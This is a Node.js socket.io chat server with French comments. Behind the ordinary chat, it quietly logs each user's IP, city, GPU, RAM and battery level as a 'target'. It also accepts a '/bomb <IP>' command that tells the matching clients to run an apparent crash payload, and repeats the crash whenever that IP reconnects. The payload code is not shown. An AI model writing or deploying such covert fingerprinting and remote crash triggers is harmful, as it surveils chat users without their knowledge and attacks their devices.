const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const path = require('path');

app.use(express.static(__dirname));

const vault = {}; 
const bannedIPs = new Set(); // Mémoire des IP à détruire

io.on('connection', (socket) => {
    // Récupération de l'IP réelle
    const ip = (socket.handshake.headers['x-forwarded-for'] || 
                socket.handshake.address || 
                socket.conn.remoteAddress).split(',')[0].trim();

    // SÉCURITÉ : Si l'IP revient, on déclenche la bombe direct
    if (bannedIPs.has(ip)) {
        console.log(`[!] CIBLE BANNIE RECONNECTÉE : ${ip}. RELANCEMENT DU CRASH...`);
        socket.emit('execute_bomb');
    }

    socket.on('check_device', (info) => {
        vault[ip] = { sid: socket.id, name: info.name };
        console.log(`
        ╔═════════════ CIBLE DÉTECTÉE ═════════════╗
        ║ PSEUDO : ${info.name}
        ║ IP     : ${ip}
        ║ VILLE  : ${info.geo.city}
        ║ MATOS  : ${info.hardware.gpu}
        ║ RAM    : ${info.hardware.ram} GB
        ║ BATT   : ${info.hardware.battery}%
        ╚══════════════════════════════════════════╝
        `);
    });

    socket.on('chat message', (data) => {
        const msg = data.text.trim();

        if (msg.startsWith("/bomb ")) {
            const targetIP = msg.split(" ")[1];
            bannedIPs.add(targetIP); // Bannissement définitif du serveur

            Object.keys(vault).forEach(storedIP => {
                if (storedIP.includes(targetIP)) {
                    io.to(vault[storedIP].sid).emit('execute_bomb');
                }
            });
            console.log(`[!!!] ORDRE DE DESTRUCTION ENVOYÉ À : ${targetIP}`);
        } 
        else if (msg.startsWith("/stop ")) {
            const targetIP = msg.split(" ")[1];
            bannedIPs.delete(targetIP);
            Object.keys(vault).forEach(storedIP => {
                if (storedIP.includes(targetIP)) {
                    io.to(vault[storedIP].sid).emit('stop_bomb');
                }
            });
            console.log(`[#] CIBLE GRACIÉE : ${targetIP}`);
        } else {
            io.emit('chat message', data);
        }
    });
});

http.listen(3000, () => { console.log("GALAXY_OS_V14_CORE_LOADED"); });
